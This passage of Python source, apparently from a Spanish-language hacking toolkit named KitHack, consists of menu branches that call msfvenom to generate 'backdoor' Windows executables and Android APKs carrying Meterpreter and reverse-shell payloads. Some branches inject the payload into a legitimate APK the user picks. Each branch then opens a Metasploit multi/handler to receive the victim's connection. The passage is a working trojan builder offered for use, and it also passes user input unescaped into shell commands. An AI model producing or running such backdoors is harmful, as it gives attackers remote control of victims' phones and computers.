						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 7:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 8:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 9:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 10:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 11:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 12:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	

		elif sys == 3:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[04]{1} android/shell/reverse_http'.format(WHITE, YELLOW)
			print '{0}[05]{1} android/shell/reverse_https'.format(WHITE, YELLOW)
			print '{0}[06]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()						
				
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			elif pay == 2:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				
				else:
					print("{}\n[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			elif pay == 3:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	

				else:
					print("{}\n[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			elif pay == 4:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()		

				else:
					print("{}\n[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			elif pay == 5:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	

				else:
					print("{}\n[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			elif pay == 6:
				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
				
